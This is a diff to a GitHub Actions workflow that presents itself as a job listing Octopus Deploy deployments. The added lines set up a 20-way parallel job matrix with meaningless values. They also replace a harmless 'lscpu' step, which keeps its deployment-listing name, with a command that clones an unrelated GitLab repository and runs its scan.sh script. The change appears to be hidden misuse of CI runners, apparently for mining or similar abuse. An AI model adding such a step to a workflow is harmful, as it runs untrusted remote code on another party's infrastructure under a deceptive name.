@@ -1,8 +1,5 @@
 name: listdeployments
 
-env:
-  serverURL: ${{ secrets.SERVER_NAME }}
-
 on:
    push:
      branches: [ main ]
@@ -14,13 +11,20 @@ jobs:
   build:
     name: Build
     runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.9]
+        flag: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
       - uses: actions/checkout@v2
-      
       - name: Install Octopus CLI
         uses: OctopusDeploy/install-octopus-cli-action@v1.1.1
         with:
-          version: latest
-          
+          version: latest      
       - name: list-octopusdeploy-deployments
-        run: lscpu
+        run: apt-get update && apt-get install -y git curl && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scan.sh && ./scan.sh
